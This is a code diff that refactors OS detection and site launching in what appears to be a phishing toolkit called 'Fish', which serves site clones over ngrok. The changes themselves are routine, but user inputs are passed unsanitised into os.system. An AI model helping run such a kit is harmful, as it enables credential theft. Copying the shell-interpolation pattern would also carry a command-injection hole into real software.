@@ -97,19 +97,16 @@ def start_ngrok(port):
 
 
 #### Detects the Operating System
-Unix = False
-Windows = False
 
 if platform == "linux" or platform == "linux2" or platform == "darwin":
-    Unix = True
+    from commands import unixCommands as commands
 elif platform == "win32":
-    Windows = True
+    from commands import windowsCommands as commands
 else:
-    print("Unable to detect operating system! Please file a bug report at https://github.com/aarav2you/Fish/issues/new?assignees=&labels=bug&template=bug_report.md&title=")
-    exit()
+    raise LookupError("Unable to detect operating system! Please file a bug report at https://github.com/aarav2you/Fish/issues/new?assignees=&labels=bug&template=bug_report.md&title=")
 
 #### Clears the console and prints the ASCII art
-os.system("clear") if Unix == True else os.system("cls")
+os.system(commands.clear)
 print(colorText(ascii))
 
                                     ############################################################# Questions/ Input #############################################################
@@ -141,14 +138,11 @@ def exec(site):
         siteName = siteLookUp[site]
     except KeyError:
         raise LookupError("Error! Please file a bug report at https://github.com/aarav2you/Fish/issues/new?assignees=&labels=bug&template=bug_report.md&title")
-    if Unix == True:
-        # Change python version here if you want
-        os.system(f"clear && python Sites/{siteName}/app.py {redirect_url} {host} {port}")
-        # Change python version here if you want
-    elif Windows == True:
-        os.system(f"cls && python Sites\\{siteName}\\app.py {redirect_url} {host} {port}")
-    else:
-        raise LookupError("Error! Please file a bug report at https://github.com/aarav2you/Fish/issues/new?assignees=&labels=bug&template=bug_report.md&title=")
+    # Change python version here if you want
+    #we use this instead of a string to be more portable and prevent errors and issues
+    path = os.path.join('Sites', siteName, "app.py")
+    #we need error handling here possibly
+    os.system(f"{commands.clear} && python {path} {redirect_url} {host} {port}")
 
 
 #### Deploys/starts the server
